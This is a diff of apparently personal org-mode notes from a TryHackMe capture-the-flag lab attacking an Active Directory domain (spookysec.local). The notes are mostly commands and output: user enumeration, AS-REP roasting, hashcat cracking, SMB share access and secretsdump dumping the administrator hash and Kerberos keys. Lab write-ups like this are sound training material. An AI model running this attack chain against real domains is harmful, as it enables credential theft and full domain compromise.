@@ -1,6 +1,7 @@
 #+TITLE: ad
 
 * enum4linux
+#+begin_src bash
 
 ┌─[✗]─[root@parrot-virtual]─[~/haxx/ctf/thm/ad]
 └──╼ # enum4linux -U -o 10.10.39.110
@@ -19,7 +20,7 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
   ====================================================
   |    Enumerating Workgroup/Domain on 10.10.39.110    |
  ====================================================
- [E] Can't find workgroup/domain
+ [E] Cant find workgroup/domain
 
 
   =====================================
@@ -52,11 +53,14 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
   |    Users on 10.10.39.110    |
  =============================
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
- [E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+ [E] Couldnt find users using querydispinfo: NT_STATUS_ACCESS_DENIED
 
  Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
- [E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+ [E] Couldnt find users using enumdomusers: NT_STATUS_ACCESS_DENIED
  enum4linux complete on Sat Nov 14 09:27:05 2020
+
+#+end_src
+
 
 * /etc/hosts
 - added the ip and the TLD for the Active Directory Domain
@@ -103,31 +107,35 @@ Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux
 #+end_src
 
 * impacket GetNPUsers.py
-
-$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:c1b863161c61cf9712fb1fb2afede37c$4b794336bad289c4d897b9aab2a9d23b773096603a78589dcd71ae6f2364407d8cb5b51f7048d21188b6a6f86dcef38f43f2b263dfbd7c8a3788792f8416d7884ed5a8e0c1f74d5b9cc874b1bf225edfd1f8b56ae0535a2ab3c867c33b36acd478cce7293b71738eeb80fd8239a739773d55aebe584358eb01ced223c5efdbe3d0254b5d8e1970910d3a2244d984a80b1e1e011c21f3dc29f8387867cc74a3b2f2caa77982a48b334b4f322dc14cf16eb6754c53eb01e592986d19dc0efeb90fd275bbb4449c238d9ff63e47394c4e9871d2dd0aedaea76b17fa0f5ce07b8c7fdfc3c55990b9f7d9a572a71eb7e9f01e87d9
+#+begin_src bash
+ $krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:c1b863161c61cf9712fb1fb2afede37c$4b794336bad289c4d897b9aab2a9d23b773096603a78589dcd71ae6f2364407d8cb5b51f7048d21188b6a6f86dcef38f43f2b263dfbd7c8a3788792f8416d7884ed5a8e0c1f74d5b9cc874b1bf225edfd1f8b56ae0535a2ab3c867c33b36acd478cce7293b71738eeb80fd8239a739773d55aebe584358eb01ced223c5efdbe3d0254b5d8e1970910d3a2244d984a80b1e1e011c21f3dc29f8387867cc74a3b2f2caa77982a48b334b4f322dc14cf16eb6754c53eb01e592986d19dc0efeb90fd275bbb4449c238d9ff63e47394c4e9871d2dd0aedaea76b17fa0f5ce07b8c7fdfc3c55990b9f7d9a572a71eb7e9f01e87d9
 
 ┌─[✗]─[root@parrot-virtual]─[~/haxx/ctf/thm/ad/impacket]
 └──╼ # python3 GetNPUsers.py spookysec.local/ -no-pass -usersfile ../users
 Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
 
-[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User james@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:c1b863161c61cf9712fb1fb2afede37c$4b794336bad289c4d897b9aab2a9d23b773096603a78589dcd71ae6f2364407d8cb5b51f7048d21188b6a6f86dcef38f43f2b263dfbd7c8a3788792f8416d7884ed5a8e0c1f74d5b9cc874b1bf225edfd1f8b56ae0535a2ab3c867c33b36acd478cce7293b71738eeb80fd8239a739773d55aebe584358eb01ced223c5efdbe3d0254b5d8e1970910d3a2244d984a80b1e1e011c21f3dc29f8387867cc74a3b2f2caa77982a48b334b4f322dc14cf16eb6754c53eb01e592986d19dc0efeb90fd275bbb4449c238d9ff63e47394c4e9871d2dd0aedaea76b17fa0f5ce07b8c7fdfc3c55990b9f7d9a572a71eb7e9f01e87d9
-[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User Paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User DARKSTAR@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User robin@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User James@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User darkstar@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User backup@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User paradox@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User JAMES@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User Robin@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User Administrator@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User Darkstar@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User Paradox@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User DARKSTAR@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
+[-] User ori@spookysec.local doesnt have UF_DONT_REQUIRE_PREAUTH set
 [-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
 
+#+end_src
+
+
 * hashcat
+#+begin_src bash
 
 ┌─[root@parrot-virtual]─[~/haxx/ctf/thm/ad]
 └──╼ # hashcat -a 0 -m 18200 18200.hash /usr/share/wordlists/rockyou.txt
@@ -188,16 +196,25 @@ Candidates.#1....: mandj4e -> mama0312
 Started: Sat Nov 14 10:29:23 2020
 Stopped: Sat Nov 14 10:29:59 2020
 
+#+end_src
+
+
 * smbclient
 - decoding
+ #+begin_src bash
+
   ┌─[root@parrot-virtual]─[~/haxx/ctf/thm/ad]
   └──╼ # echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw > base64_encoded && cat base64_encoded | base64 -d > decoded && cat decoded
+
+ #+end_src
   : backup@spookysec.local:backup2517860
 
 -file  backup_credentials.txt
 : 3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 
 : smbclient -L 10.10.39.110 -U svc-admin
+#+begin_src bash
+
 ┌─[root@parrot-virtual]─[~/haxx/ctf/thm/ad]
 └──╼ # smbclient -L 10.10.39.110 -U svc-admin
 Enter WORKGROUP\svc-admin's password:
@@ -212,7 +229,11 @@ Enter WORKGROUP\svc-admin's password:
  SYSVOL          Disk      Logon server share
  SMB1 disabled -- no workgroup available
 
+#+end_src
+
 : smbclient \\\\10.10.39.110\\backup -U svc-admin
+
+#+begin_src bash
 
 ┌─[✗]─[root@parrot-virtual]─[~/haxx/ctf/thm/ad]
 └──╼ # smbclient \\\\10.10.39.110\\backup -U svc-admin
@@ -226,9 +247,13 @@ backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
 8247551 blocks of size 4096. 4021973 blocks available
 smb: \>
 
+#+end_src
+
 * impacket secretsdump.py
 - admin
   :  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+
+#+begin_src bash
 
 ┌─[✗]─[root@parrot-virtual]─[~/haxx/ctf/thm/ad/impacket]
 └──╼ # python3 secretsdump.py -dc-ip 10.10.39.110 spookysec.local/backup@10.10.39.110
@@ -309,3 +334,5 @@ ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:663cd6165560728d68523414176931b116e4cc3
 ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:a8937dc0a1448d9c6ff87e04fcef1534
 ATTACKTIVEDIREC$:des-cbc-md5:497a40a1fd4a616b
 [*] Cleaning up...
+
+#+end_src
